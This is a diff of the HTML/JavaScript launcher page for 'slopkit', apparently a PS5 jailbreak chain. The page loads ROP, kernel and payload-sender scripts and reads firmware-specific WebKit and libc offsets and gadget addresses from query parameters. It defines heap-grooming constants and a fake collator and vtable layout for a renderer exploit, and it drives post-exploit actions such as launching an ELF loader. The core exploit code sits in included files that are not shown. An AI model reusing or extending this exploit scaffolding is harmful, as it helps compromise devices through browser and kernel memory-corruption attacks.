@@ -1,50 +1,224 @@
 <!doctype html>
-<meta charset="utf-8"><title>PS5 renderer notify proof</title>
+<html lang="en" dir="ltr" data-renderer-state="loading">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>slopkit</title>
+<!-- Reserved preload placeholder preserves parsed document shape. -->
+<link rel="stylesheet" href="src/theme.css">
 <style>
-html, body { margin: 0; min-height: 100%; background: #0c0c0f; }
 body {
-    color: #cccccc;
-    font-family: Arial, sans-serif;
     display: flex; flex-direction: column; align-items: center;
-    padding: 18px 12px 8px 12px;
+    min-height: 100vh; padding: 18px 12px;
 }
 #cap {
-    font-size: 26px; font-weight: 800; letter-spacing: 1px;
-    text-align: center; margin-bottom: 12px; color: #ffffff;
+    margin-bottom: 14px; color: var(--text);
+    font-size: 28px; font-weight: 800; letter-spacing: .5px;
+    text-align: center;
 }
 #cat {
-    width: 260px; max-width: 72vw; border-radius: 10px; display: block;
-    box-shadow: 0 0 0 2px #2a2a2e, 0 0 22px 4px #2a2a2e;
-    transition: box-shadow 0.4s ease;
+    display: block; width: 280px; max-width: 80vw;
+    border: 1px solid var(--border); border-radius: 12px;
+    box-shadow: 0 8px 24px rgba(0,0,0,.28);
 }
-#cat { border: 4px solid transparent; }
-#cat.run { animation: pulse 1.1s ease-in-out infinite; }
-#cat.ok  { border-color: #16c60c; box-shadow: 0 0 0 2px #16c60c, 0 0 40px 10px rgba(22,198,12,0.75); animation: none; }
-#cat.bad { border-color: #e74856; box-shadow: 0 0 0 2px #e74856, 0 0 34px 8px rgba(231,72,86,0.6); animation: none; }
-@keyframes pulse {
-    0%,100% { box-shadow: 0 0 0 2px #35507a, 0 0 16px 3px rgba(53,80,122,0.5); }
-    50%     { box-shadow: 0 0 0 2px #4f7fd6, 0 0 30px 8px rgba(79,127,214,0.7); }
+#result {
+    width: min(800px, 92vw); margin-top: 16px; padding: 20px;
+    text-align: center;
 }
+#result-status { min-width: 0; }
+#stage-banner {
+    margin: 0; color: var(--text);
+    font-size: 28px; line-height: 1.2; font-weight: 800;
+    letter-spacing: .3px; overflow-wrap: anywhere;
+}
+#stage-banner.ok { color: var(--success-text); }
+#stage-banner.bad { color: var(--danger-text); }
+#stage-banner:empty { display: none; }
 #status {
-    font-size: 17px; font-weight: bold; letter-spacing: 1px;
-    text-align: center; margin: 14px 0 4px 0; min-height: 1.2em;
+    margin: 6px 0 0; color: var(--muted);
+    font-size: 18px; line-height: 1.4; font-weight: 600;
+    text-align: center; overflow-wrap: anywhere;
+}
+#status:empty { display: none; }
+#status.ok { color: var(--success-text); }
+#status.bad { color: var(--danger-text); }
+#post-actions {
+    width: 100%; margin-top: 16px;
+}
+.post-action-list {
+    display: flex; gap: 12px; align-items: stretch;
+}
+.post-action-item { flex: 1 1 0; min-width: 0; }
+.post-action {
+    width: 100%; padding: 12px 20px;
+    font-size: 20px; line-height: 1.25; cursor: pointer;
+    overflow-wrap: anywhere;
+}
+.post-action.failed { background: var(--danger-bg); border-color: var(--danger-border); color: var(--danger-text); }
+.post-action[aria-disabled="true"] { cursor: default; }
+.post-action.done {
+    border-color: var(--success-border); background: var(--success-bg); color: var(--success-text);
+}
+.post-action.unavailable {
+    border-color: var(--border); background: var(--raised); color: var(--muted);
 }
 #scr {
-    margin: 8px 0 0 0; white-space: pre; color: #5a5a5a; font-size: 11px;
-    font-family: "Consolas", monospace; max-width: 92vw; overflow: hidden;
-    text-align: center; line-height: 1.35;
+    margin: 0; padding: 0; white-space: pre-wrap; color: var(--muted);
+    font-size: 16px; font-family: "Consolas", monospace;
+    max-width: 100%; width: 100%; max-height: 320px;
+    overflow-y: auto; overflow-x: hidden;
+    overflow-wrap: anywhere;
+    text-align: start; line-height: 1.4;
 }
-.ok { color: #16c60c; }
-.bad { color: #e74856; }
-.run { color: #cccccc; }
+#scr .log-info { color: var(--muted); }
+#scr .log-warn { color: var(--focus); }
+#scr .log-ok   { color: var(--success-text); }
+#scr .log-fail { color: var(--danger-text); }
+#diagnostics {
+    width: min(800px, 92vw); margin-top: 12px; padding: 14px;
+    text-align: start;
+}
+#diagnostics-heading {
+    margin: 0 0 8px; color: var(--text);
+    font-size: 16px; line-height: 1.2; font-weight: 700;
+}
+@supports (display: grid) {
+    .post-action-list {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    }
+}
+@media (max-height: 800px) {
+    body { padding-top: 10px; }
+    #cap { margin-bottom: 8px; }
+    #cat { width: 200px; }
+    #result { margin-top: 10px; padding: 16px; }
+    #post-actions { margin-top: 12px; }
+    #scr { max-height: 160px; }
+}
+@media (max-width: 700px) {
+    .post-action-list { display: grid; grid-template-columns: 1fr; }
+}
 </style>
+</head>
 <body>
-<div id="cap">PoC PS5 FW &mdash;</div>
+<div id="cap">slopkit</div>
 <img id="cat" class="run" src="cat.jpg" alt="">
+<section id="result" class="surface">
+    <div id="result-status" role="status" aria-live="polite" aria-atomic="true">
+        <h1 id="stage-banner"></h1>
+        <p id="status" class="run"></p>
+    </div>
+    <section id="post-actions" aria-label="Post-exploit actions"
+             data-i18n-aria-label="runtime.actions.heading"
+             aria-hidden="true" style="opacity:0.001;pointer-events:none">
+        <!--
+            Keep a small fixed pool in the parsed document. PS5 WebKit can exhaust
+            its post-exploit DOM/rendering budget when controls are created after
+            the kernel and GPU stages have completed.
+        -->
+        <div id="post-action-list" class="post-action-list">
+            <div class="post-action-item" data-post-action-slot>
+                <a class="button primary post-action post-action-primary"
+                   role="button" tabindex="-1" aria-disabled="true"
+                   data-post-action-primary data-i18n="runtime.requested.run"
+                   aria-describedby="status">Run requested action</a>
+            </div>
+            <div class="post-action-item" data-post-action-slot>
+                <a class="button primary post-action post-action-primary"
+                   role="button" tabindex="-1" aria-disabled="true"
+                   data-post-action-primary data-i18n="runtime.autoloader.launch"
+                   aria-describedby="status">Launch Unified Autoloader</a>
+            </div>
+            <div class="post-action-item" data-post-action-slot hidden>
+                <a class="button primary post-action post-action-primary"
+                   role="button" tabindex="-1" aria-disabled="true"
+                   data-post-action-primary aria-describedby="status"></a>
+            </div>
+            <div class="post-action-item" data-post-action-slot hidden>
+                <a class="button primary post-action post-action-primary"
+                   role="button" tabindex="-1" aria-disabled="true"
+                   data-post-action-primary aria-describedby="status"></a>
+            </div>
+        </div>
+    </section>
+</section>
+<section id="diagnostics" class="surface" aria-labelledby="diagnostics-heading" hidden>
+    <h2 id="diagnostics-heading" data-i18n="runtime.diagnostics.heading">Console</h2>
+    <pre id="scr"></pre>
+</section>
+<script src="src/i18n.js"></script>
+<script src="src/state.js"></script>
+<script src="src/u64.js"></script>
+<script src="src/memory.js"></script>
+<script src="src/profile.js"></script>
+<script src="src/native.js"></script>
+<script src="src/rop.js"></script>
+<script src="src/kernel.js"></script>
+<script src="src/p2jb.js"></script>
+<script src="src/ipv6-kernel-rw.js"></script>
+<script src="src/lapse.js"></script>
+<script src="src/post.js"></script>
+<script src="src/pending-action.js"></script>
+<script src="src/payload-sender.js"></script>
+<script src="src/runtime.js"></script>
 <script>
 "use strict";
 
 const Q = new URLSearchParams(location.search);
+const I18n = Slopkit.I18n;
+const localeReady = I18n.activate(Q.get("lang") || "auto",
+    Array.isArray(navigator.languages) && navigator.languages.length
+        ? navigator.languages : [navigator.language || "en"]);
+I18n.apply(document);
+const RUN_MODE = Q.get("mode") || "elf-loader";
+const SELECTED_EXPLOIT = Q.get("exploit") || "poops";
+const VALID_EXPLOITS = new Set(["poops", "lapse", "p2jb"]);
+const OFFSETS_URL = "offsets/offsets.json";
+const RENDERER_CONTRACT_QUERY = Q.get("rc") || "";
+const resultNode = document.getElementById("result");
+const postActionsNode = document.getElementById("post-actions");
+const postActionList = document.getElementById("post-action-list");
+const postActionSlots = Array.from(postActionList.querySelectorAll(
+    "[data-post-action-slot]"), function (item) {
+    return {
+        item,
+        control: item.querySelector("[data-post-action-primary]")
+    };
+});
+const diagnosticsNode = document.getElementById("diagnostics");
+let payloadActionBusy = false;
+let postActionModel = [];
+let postActionNotice = null;
+let postActionSurfacePrimed = false;
+let postActionRevealTimer = null;
+let postActionSurfaceVisible = false;
+
+function t(key, values) {
+    return I18n.t(key, values);
+}
+
+// This parse-only split value keeps an unarmed page evaluable when its query
+// is absent. Every armed path rejects the missing query before startAttempt().
+const PARSE_ONLY_RENDERER_CONTRACT = Slopkit.Profile.decodeRendererContract(
+    "[1,1,48,8,16,24,8,32,8,40,1,88,562949953421312,131072,16976,0,1,64,8,16,6,24,0,48,40,8,32,8,16,24,48,26,14,56,8,0,40,48,32,26,12,56,23,16,24,32,40,48,49,50,51,52,53,1,0,1,2]");
+let RENDERER_CONTRACT = null;
+let RENDERER_CONTRACT_ERROR = "";
+try {
+    RENDERER_CONTRACT = Slopkit.Profile.decodeRendererContract(
+        RENDERER_CONTRACT_QUERY);
+} catch (error) {
+    RENDERER_CONTRACT_ERROR = `${error?.name}:`
+        + String(error?.message).slice(0, 96);
+}
+const RENDERER_LAYOUT = RENDERER_CONTRACT?.rendererLayout
+    || PARSE_ONLY_RENDERER_CONTRACT.rendererLayout;
+const RENDERER_ENCODING = RENDERER_CONTRACT?.rendererEncoding
+    || PARSE_ONLY_RENDERER_CONTRACT.rendererEncoding;
+const RENDERER_BOOTSTRAP = RENDERER_CONTRACT?.rendererBootstrap
+    || PARSE_ONLY_RENDERER_CONTRACT.rendererBootstrap;
+const RENDERER_OBJECTS = RENDERER_CONTRACT?.rendererObjects
+    || PARSE_ONLY_RENDERER_CONTRACT.rendererObjects;
 
 function intParam(name, fallback, lo, hi) {
     const raw = parseInt(Q.get(name) ?? "", 10);
@@ -58,9 +232,6 @@ function hexParam(name, fallback) {
     return Number.isFinite(raw) && raw > 0 ? raw : fallback;
 }
 
-// Comma-separated hex list, e.g. hc=0x34f98,0x35808,0x35900. The base anchor
-// has several candidate thunks per build; the correct one is picked at runtime
-// as the one yielding a page-aligned webkitBase.
 function hexListParam(name, fallback) {
     const v = Q.get(name);
     if (!v) return fallback;
@@ -72,8 +243,6 @@ function hexListParam(name, fallback) {
     return out.length ? out : fallback;
 }
 
-// Per-firmware offsets. Defaults are the hardware-verified 11.60 values; the
-// launcher supplies the correct set for 9.00-13.20 via query params.
 const P_HOST_CTOR_LIST = hexListParam("hc", [0x1e0d8, 0x1e320, 0x1f368]);
 const P_NOTIFY = hexParam("notify", 0x4740);
 const P_GADGET = hexParam("gd", 0x1d11a);
@@ -83,13 +252,21 @@ const P_CLOSE_SLOT = hexParam("cls", 0x34f57a8);
 const P_CLOSE_EXP = hexParam("cle", 0x26e70);
 const P_ERROR_SLOT = hexParam("ers", 0x34f57b0);
 const P_ERROR_EXP = hexParam("ere", 0xf340);
+const P_ATTESTATION_KIND = Q.get("att") || "";
+const SLOPKIT_ATTESTATION_KIND = "slopkit-live-v2";
+const REFERENCE_ATTESTATION =
+    P_ATTESTATION_KIND === SLOPKIT_ATTESTATION_KIND;
+const P_KERNEL_IMPORT_SLOT = hexParam("kis", 0);
+const P_KERNEL_IMPORT_EXPORT = hexParam("kie", 0);
+const P_LIBC_IMPORT_SLOT = hexParam("lis", 0);
+const P_LIBC_IMPORT_EXPORT = hexParam("lie", 0);
 
 const DRAIN_COUNT = intParam("n", 512, 64, 1024);
+const SCREEN_LINES = intParam("lines", 64, 0, 400);
+const PLACEMENT_PAIRS = 4;
 
-const REVISION = "renderer-notify-auto-proof-2";
-const AUTO_RETRY_DELAY_MS = intParam("rd", 50, 0, 60000);
-const MAX_ATTEMPTS = intParam("max", 0, 0, 1000000);
-const SCREEN_LINES = intParam("lines", 14, 0, 400);
+const REVISION = "slopkit-full-chain-v1";
+const RUNTIME_REVISION_FALLBACK = "runtime-staged-loader-recovery-v3";
 const K = 2;
 const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
@@ -97,54 +274,25 @@ const CONTROL_INT = -64000;
 const FILLER_BIGINTS = K - 1;
 const FILLER_OBJECTS = 0xfffe - K;
 const EXPECTED_LENGTH = 0x50001;
-const CELL_BYTES = 0x30;
-const FUNCTION_BYTES = 0x20;
-const NATIVE_EXECUTABLE_BYTES = 0x38;
-const HOLDER_BYTES = 0x40;
-const ARENA_VIEW_BYTES = 0x30;
-const COLLATOR_BYTES = 0x38;
-const BOUND_COMPARE_BYTES = 0x20;
-const PARSEINT_NATIVE_OFFSET = 0x1ea18;
-let HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[0];
-const WEBKIT_TEXT_SIZE = 0x2c7c000;
-
-const WEBKIT_RELRO_START = 0x32d8000;
-const WEBKIT_RELRO_END = 0x34f7e48;
-const IMPORT_WINDOW_A_OFFSET = 0x34f5708;
-const IMPORT_WINDOW_A_BYTES = 0xd0;
-const IMPORT_WINDOW_B_OFFSET = 0x34f5860;
-const IMPORT_WINDOW_B_BYTES = 0x38;
-
-const REQUIREMENTS_OBJECT_A_SLOT = 0x00;
-const REQUIREMENTS_OBJECT_A_OFFSET = 0x29f350;
-const REQUIREMENTS_OBJECT_B_SLOT = 0x08;
-const REQUIREMENTS_OBJECT_B_OFFSET = 0x29f348;
-const KERNEL_OBJECT_SLOT = 0x10;
-const KERNEL_OBJECT_OFFSET = 0x6d1d0;
-const CXA_FINALIZE_SLOT = 0x40;
-const CXA_FINALIZE_OFFSET = 0x173e0;
-const STRLEN_SLOT = 0x70;
-const STRLEN_OFFSET = 0x44c0;
-const CLOSE_SLOT = 0xa0;
-const CLOSE_OFFSET = 0x26e70;
-const ERROR_SLOT = 0xa8;
-const ERROR_OFFSET = 0xf340;
-const GETPID_SLOT = 0xb0;
-const GETPID_OFFSET = 0x1b280;
-const STRERROR_SLOT = 0xc8;
-const STRERROR_OFFSET = 0x77070;
-const PTHREAD_GETSPECIFIC_SLOT = 0x00;
-const PTHREAD_GETSPECIFIC_OFFSET = 0x40dd0;
-const MEMCHR_SLOT = 0x30;
-const MEMCHR_OFFSET = 0x3c40;
-const LIBC_TEXT_SIZE = 0x128000;
-const KERNEL_TEXT_SIZE = 0x44000;
+const CELL_BYTES = RENDERER_LAYOUT.snapshotBytes;
+const FUNCTION_BYTES = RENDERER_OBJECTS.jsFunction.snapshotBytes;
+const NATIVE_EXECUTABLE_BYTES =
+    RENDERER_OBJECTS.nativeExecutable.snapshotBytes;
+const HOLDER_BYTES = RENDERER_OBJECTS.plainObject.snapshotBytes;
+const ARENA_VIEW_BYTES = RENDERER_OBJECTS.uint8Array.snapshotBytes;
+const COLLATOR_BYTES = RENDERER_OBJECTS.intlCollator.snapshotBytes;
+const COLLATOR_STABLE_READ_ROUNDS = 3;
+const BOUND_COMPARE_BYTES = RENDERER_OBJECTS.boundFunction.snapshotBytes;
+const WEBKIT_TEXT_SIZE = hexParam("wts", 0x2c7c000);
+const WEBKIT_CODE_LIMIT = REFERENCE_ATTESTATION
+    ? hexParam("wcl", 0) : WEBKIT_TEXT_SIZE;
+const NATIVE_TEXT_SIZE_QUERY = Q.get("nts") || "";
+const NATIVE_TEXT_SIZE = hexParam("nts", 0);
+const NATIVE_TEXT_SIZE_QUERY_VALID = /^0x[0-9a-f]+$/i.test(
+    NATIVE_TEXT_SIZE_QUERY) && NATIVE_TEXT_SIZE > 0;
 
 const NATURAL_TRAMPOLINE_OFFSET = P_GADGET;
 const NOTIFY_OFFSET = P_NOTIFY;
-const NOTIFICATION_REQUEST_SIZE = 0xc30;
-const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
-const NOTIFICATION_MESSAGE = "PoC Sandbox Escape";
 const ARENA_BYTES = 0x1000;
 const FAKE_UCOLLATOR_OFFSET = 0x100;
 const FAKE_VTABLE_OFFSET = 0x300;
@@ -169,42 +317,46 @@ const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
 const holderHeader = new Uint8Array(HOLDER_BYTES);
 const arenaViewHeader = new Uint8Array(ARENA_VIEW_BYTES);
 const collatorHeader = new Uint8Array(COLLATOR_BYTES);
+// Reuse the retired holder header to avoid a pre-groom allocation.
+const collatorHeaderRepeat = holderHeader;
 const compareFnHeader = new Uint8Array(BOUND_COMPARE_BYTES);
-const collatorOriginal = new Uint8Array(COLLATOR_BYTES - 0x18);
-const importWindowA1 = new Uint8Array(IMPORT_WINDOW_A_BYTES);
-const importWindowA2 = new Uint8Array(IMPORT_WINDOW_A_BYTES);
-const importWindowB1 = new Uint8Array(IMPORT_WINDOW_B_BYTES);
-const importWindowB2 = new Uint8Array(IMPORT_WINDOW_B_BYTES);
+const collatorOriginal = new Uint8Array(COLLATOR_BYTES
+    - RENDERER_OBJECTS.intlCollator.collatorOffset);
 const scratchBits = new ArrayBuffer(8);
 const scratchBytes = new Uint8Array(scratchBits);
 const scratchWords = new Uint32Array(scratchBits);
 const scratchDouble = new Float64Array(scratchBits);
 
 const navigationID = Date.now().toString(36);
-const autoMode = Q.get("auto") !== "0";
-const allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
+const singleAttemptPolicy = Q.get("auto") === "0" && Q.get("max") === "1";
 const armed = Q.get("go") === "1";
-const attemptKey = `${REVISION}:attempts`;
-const passKey = `${REVISION}:passed`;
+const PREVIEW_MODE = Q.get("preview") || "";
+const COMPLETE_PREVIEW = !armed && PREVIEW_MODE === "complete";
+const POST_ACTION_PREVIEW = !armed
+    && (PREVIEW_MODE === "actions" || COMPLETE_PREVIEW);
+const POST_ACTION_REVEAL_DELAY_MS = 750;
+const runToken = Q.get("run") || "";
+const validRunToken = /^[0-9a-f]{32}$/i.test(runToken);
+const runKey = validRunToken ? `${REVISION}:run:${runToken}` : "";
 const blockKey = `${REVISION}:blocked`;
 
-let priorAttempts = 0;
-let alreadyPassed = false;
 let alreadyBlocked = false;
 try {
-    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) ?? "0", 10);
-    if (!Number.isFinite(priorAttempts) || priorAttempts < 0)
-        priorAttempts = 0;
-    alreadyPassed = sessionStorage.getItem(passKey) === "1";
     alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
 } catch {}
 
-let attemptNumber = priorAttempts + 1;
 let seq = 0;
+const screenLines = [];
+
 let keepIndex = 0;
 let stopped = false;
 let keepAlive = null;
-const screenLines = [];
+let persistentCarrier = null;
+let preloadedProfile = null;
+let runtimeStarted = false;
+let rendererAttemptStarted = false;
+let runtimeExtensionLoading = false;
+let runtimeExtensionCarrierPassed = false;
 
 let referenceTarget = null;
 let rwBuffer = null;
@@ -219,9 +371,6 @@ let arenaBuffer = null;
 let arenaView = null;
 let realCollator = null;
 let compareFn = null;
-let notificationRequest = "";
-let notificationRequestOK = false;
-let notificationPrewarmResult = 0;
 let targetHolder = null;
 let holderGuardA = null;
 let holderGuardB = null;
@@ -235,13 +384,10 @@ let capturedString = null;
 let capturedWords = null;
 let copiedLength = 0;
 let captureState = 0;
-let captureError = null;
 let hostAddress = NaN;
 let fakeAddress = NaN;
 
 let predecessorWords = null;
-let pointerLow = 0;
-let pointerHigh = 0;
 let targetAddress = NaN;
 let targetAddressLow = 0;
 let targetAddressHigh = 0;
@@ -254,8 +400,6 @@ let rwOriginalVector = NaN;
 let rwHeaderOK = false;
 let functionHeaderOK = false;
 let nativeExecutableHeaderOK = false;
-let functionStructureID = 0;
-let nativeExecutableStructureID = 0;
 let executableAddress = NaN;
 let nativeFunctionAddress = NaN;
 let nativeConstructorAddress = NaN;
@@ -265,46 +409,15 @@ let pointersRepeated = false;
 let restoreObserved = false;
 let retrySafe = false;
 let retryScheduled = false;
-let attemptPersisted = false;
 let candidateEverReturned = false;
 let candidateMutationStarted = false;
 let zeroHeaderMiss = false;
-let gotReadAttempted = false;
-let gotWindowAddressesOK = false;
-let gotWindowsRepeated = false;
-let gotCanonicalOK = false;
 let gotReadOK = false;
 
-let requirementsObjectA = 0;
-let requirementsObjectB = 0;
-let requirementsBase = NaN;
-let requirementsBaseOK = false;
-let kernelObjectPointer = 0;
-let kernelObjectBase = NaN;
-let kernelObjectBaseOK = false;
-
-let cxaFinalizePointer = 0;
-let strlenPointer = 0;
-let strerrorPointer = 0;
-let memchrPointer = 0;
-let closePointer = 0;
-let errorPointer = 0;
-let getpidPointer = 0;
-let pthreadGetspecificPointer = 0;
-let cxaFinalizeStatus = 0;
-let strlenStatus = 0;
-let strerrorStatus = 0;
-let memchrStatus = 0;
-let closeStatus = 0;
-let errorStatus = 0;
-let getpidStatus = 0;
-let pthreadGetspecificStatus = 0;
-let libcBase = NaN;
-let libcResolvedCount = 0;
-let libcBaseOK = false;
 let kernelBase = NaN;
-let kernelResolvedCount = 0;
 let kernelBaseOK = false;
+let libcBase = NaN;
+let libcBaseOK = false;
 
 let holderHeaderOK = false;
 let arenaViewHeaderOK = false;
@@ -319,14 +432,12 @@ let notifyEntryAddress = NaN;
 let notifyAddressOK = false;
 let arenaLayoutOK = false;
 let arenaFilledOK = false;
-let carrierArmedForCommit = false;
-let notifyReady = false;
-let commitStarted = false;
-let commitBlockConfirmed = false;
+let carrierReady = false;
+let handoffReady = false;
+let attemptBlocked = false;
 
 let compositionState = 0;
 let compositionLength = 0;
-let compositionError = null;
 
 const FW_LABEL = (function () {
     const p = Q.get("fw");
@@ -335,79 +446,399 @@ const FW_LABEL = (function () {
     return m ? m[1] : "??.??";
 })();
 
+// The launcher's arm record is the durable attempt identity. Read it
+// without mutating storage so early renderer failures use the same tuple as
+// attempt_started, before the profile fetch has completed.
+let ARM_CONTEXT_ERROR = "";
+const ARM_CONTEXT = (function () {
+    try {
+        const id = Q.get("arm") || "";
+        if (!/^[0-9a-f]{32}$/i.test(id)) {
+            ARM_CONTEXT_ERROR = "renderer arm token is invalid";
+            return {};
+        }
+        const value = JSON.parse(sessionStorage.getItem(
+            `slopkit:arm:${id}`) || "null");
+        if (!value || value.firmware !== FW_LABEL
+            || value.mode !== "full-chain"
+            || value.exploit !== SELECTED_EXPLOIT) {
+            ARM_CONTEXT_ERROR =
+                "renderer arm token is bound to another exploit profile";
+            return {};
+        }
+        return value;
+    } catch {
+        ARM_CONTEXT_ERROR = "renderer arm token could not be read";
+        return {};
+    }
+})();
+
+function verifyArmContextProfile(profile) {
+    if (ARM_CONTEXT_ERROR) throw new Error(ARM_CONTEXT_ERROR);
+    if (RUN_MODE !== "elf-loader" || profile?.mode !== "elf-loader"
+        || profile.firmware !== FW_LABEL
+        || profile.exploit !== SELECTED_EXPLOIT)
+        throw new Error("renderer profile does not match the armed launch");
+    const qualification = profile.qualificationRecord?.();
+    if (!qualification
+        || ARM_CONTEXT.profileRevision !== qualification.profileRevision
+        || ARM_CONTEXT.engineRevision !== qualification.engineRevision
+        || ARM_CONTEXT.runtimeRevision !== qualification.runtimeRevision)
+        throw new Error("renderer arm token has stale profile revisions");
+    return true;
+}
+
 function setCaption(text) {
     try { document.getElementById("cap").textContent = text; } catch {}
 }
 
+const IMG_IDLE    = "cat.jpg";
+
 function catState(cls) {
-    try { document.getElementById("cat").className = cls; } catch {}
-}
-
-setCaption(`PoC PS5 FW ${FW_LABEL}`);
-
-function screenLine(text) {
-    screenLines.push(text.length > 110 ? `${text.slice(0, 107)}...` : text);
-    if (screenLines.length > SCREEN_LINES)
-        screenLines.splice(0, screenLines.length - SCREEN_LINES);
     try {
-        document.getElementById("scr").textContent = screenLines.join("\n");
+        var el = document.getElementById("cat");
+        el.className = cls;
+        el.src = IMG_IDLE;
     } catch {}
 }
 
-// Diagnostic beacons to the lab server's /log endpoint. Auto-disabled on a
-// static host (e.g. GitHub Pages) where /log does not exist; force with ?log=1.
-const LOG_ON = Q.get("log") === "1"
-    || (Q.get("log") !== "0" && !/github\.io$/i.test(location.hostname));
+function setStageBanner(text, cls) {
+    try {
+        var el = document.getElementById("stage-banner");
+        el.textContent = text;
+        el.className = cls || "";
+        resultNode.className = "surface"
+            + (String(cls || "").split(/\s+/).includes("bad") ? " tone-bad"
+                : String(cls || "").split(/\s+/).includes("ok")
+                    ? " tone-ok" : "");
+    } catch {}
+}
 
+const logStartTime = Date.now();
+
+function screenLine(text, severity, unabridged) {
+    var elapsed = ((Date.now() - logStartTime) / 1000).toFixed(1);
+    var ts = "[" + elapsed + "s] ";
+    var cls = "log-" + (severity || "info");
+    var display = !unabridged && text.length > 110
+        ? text.slice(0, 107) + "..." : text;
+    screenLines.push({ text: ts + display, cls: cls });
+    if (screenLines.length > SCREEN_LINES)
+        screenLines.splice(0, screenLines.length - SCREEN_LINES);
+    try {
+        var scrEl = document.getElementById("scr");
+        if (SCREEN_LINES === 0) return;
+        var wasEmpty = scrEl.childNodes.length === 0;
+        var wasAtBottom = wasEmpty
+            || scrEl.scrollHeight - scrEl.scrollTop - scrEl.clientHeight <= 4;
+        if (!wasEmpty) scrEl.appendChild(document.createTextNode("\n"));
+        var row = document.createElement("span");
+        row.className = cls;
+        row.textContent = ts + display;
+        scrEl.appendChild(row);
+        while (scrEl.children.length > SCREEN_LINES) {
+            scrEl.removeChild(scrEl.firstChild);
+            if (scrEl.firstChild && scrEl.firstChild.nodeType === 3)
+                scrEl.removeChild(scrEl.firstChild);
+        }
+        // Preserve an operator's scrollback position. Follow new output only
+        // while the log was already at the bottom.
+        if (wasAtBottom) scrEl.scrollTop = scrEl.scrollHeight;
+    } catch {}
+}
+
+const DIAGNOSTICS_ON = Q.get("diag") === "1";
+const QUIET_LAPSE_UI = SELECTED_EXPLOIT === "lapse";
+let diagnosticsQuiet = false;
+const deferredDiagnostics = [];
+diagnosticsNode.hidden = !DIAGNOSTICS_ON;
+
+function setDiagnosticsQuiet(value) {
+    diagnosticsQuiet = value === true;
+    if (diagnosticsQuiet || !DIAGNOSTICS_ON) return;
+    while (deferredDiagnostics.length) {
+        const item = deferredDiagnostics.shift();
+        note(item.tag, item.extra, item.severity);
+    }
+}
 function mark(tag, extra) {
     seq++;
-    const line = `a${attemptNumber}-r${navigationID}-s${seq}-note-${tag}`
-        + (extra !== undefined ? `-${extra}` : "");
-    if (LOG_ON) {
-        try {
-            const xhr = new XMLHttpRequest();
-            xhr.open("GET", `log/${encodeURIComponent(line)}`, false);
-            xhr.send();
-        } catch {}
+    var severity = "info";
+    if (/^(HARD-STOP|FAILED|POWER-OFF-REQUIRED)/.test(tag)
+            || /-FAILED$/.test(tag))
+        severity = "fail";
+    else if (/^(REPORT-COMPOSITION|RUNTIME-LAUNCH|ARMED-INIT|RUNTIME-EXTENSION-LOAD-DONE|ELFLDR-READY|RUNTIME-COMPLETE|PAYLOAD-SENT|REQUESTED-ACTION-SENT)/.test(tag)) severity = "ok";
+    else if (/^(EARLY-SAFE-FINISH|REBOOT-REQUIRED)/.test(tag)) severity = "warn";
+    const terminal = /^(HARD-STOP|FAILED|POWER-OFF-REQUIRED|REBOOT-REQUIRED|LAPSE-(?:SEALED|QUARANTINED))/.test(tag);
+    const lapseCritical = /^(LAPSE-|KERNEL-RW-RETURNED|ROOT-|GPU-|ELFLDR-|PAYLOAD-|BROWSER-)/
+        .test(tag);
+    // Quiet Lapse runs avoid rebuilding the scrollback DOM while the kernel
+    // primitive is active. showStatus/setStageBanner still update one text
+    // node so the operator can see coarse progress.
+    if (!DIAGNOSTICS_ON) return;
+    if (!terminal && (diagnosticsQuiet
+            || (QUIET_LAPSE_UI && lapseCritical))) {
+        deferredDiagnostics.push({ tag, extra, severity });
+        if (deferredDiagnostics.length > SCREEN_LINES)
+            deferredDiagnostics.shift();
+        return;
     }
-    screenLine(`[${String(attemptNumber).padStart(3, "0")}] ${tag}`
-        + (extra !== undefined ? ` ${extra}` : ""));
+    note(tag, extra, severity);
+}
+
+function note(tag, extra, severity) {
+    const unabridged = /^(HARD-STOP|POWER-OFF-REQUIRED|REBOOT-REQUIRED)$/.test(tag);
+    screenLine(`${tag}` + (extra !== undefined ? ` ${extra}` : ""),
+        severity, unabridged);
 }
 
 function showStatus(text, cls) {
     try {
         const node = document.getElementById("status");
         node.textContent = text;
-        node.className = cls;
+        node.className = cls || "";
     } catch {}
 }
 
-function failed() {
-    // Relentless mode: never stop for the user. Reset and try again.
-    mark("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
-    stopped = false;
-    retryScheduled = false;
-    catState("run");
-    setCaption(`PoC PS5 FW ${FW_LABEL}`);
-    showStatus(`retrying  (attempt ${attemptNumber + 1})`, "run");
-    setTimeout(() => {
-        try { history.replaceState(null, ""); } catch {}
-        attemptNumber++;
-        startAttempt();
-    }, AUTO_RETRY_DELAY_MS);
+function showPostActionNotice(notice) {
+    if (!notice?.headlineKey) return;
+    const cls = notice.cls || "";
+    setStageBanner(t(notice.headlineKey, notice.headlineValues), cls);
+    showStatus(notice.detailKey
+        ? t(notice.detailKey, notice.detailValues) : "", cls);
 }
 
-function succeeded(detail) {
+function setNodeText(node, value) {
+    if (node.textContent !== value) node.textContent = value;
+}
+
+function activatePostAction(event) {
+    if (event.currentTarget.getAttribute("aria-disabled") === "true") return;
+    const actionId = event.currentTarget.dataset.actionId;
+    let action = null;
+    for (const candidate of postActionModel) {
+        if (candidate.id === actionId) {
+            action = candidate;
+            break;
+        }
+    }
+    if (!action) return;
+    runPostAction(action);
+}
+
+function setPostActionEnabled(control, enabled) {
+    const ariaDisabled = enabled ? "false" : "true";
+    const tabIndex = enabled ? 0 : -1;
+    if (control.getAttribute("aria-disabled") !== ariaDisabled)
+        control.setAttribute("aria-disabled", ariaDisabled);
+    if (control.tabIndex !== tabIndex) control.tabIndex = tabIndex;
+}
+
+function stagePostActionSurface() {
+    postActionSurfaceVisible = false;
+    postActionsNode.style.opacity = "0.001";
+    postActionsNode.style.pointerEvents = "none";
+    postActionsNode.setAttribute("aria-hidden", "true");
+}
+
+function revealPostActionSurface(interactive) {
+    postActionSurfaceVisible = true;
+    postActionsNode.hidden = false;
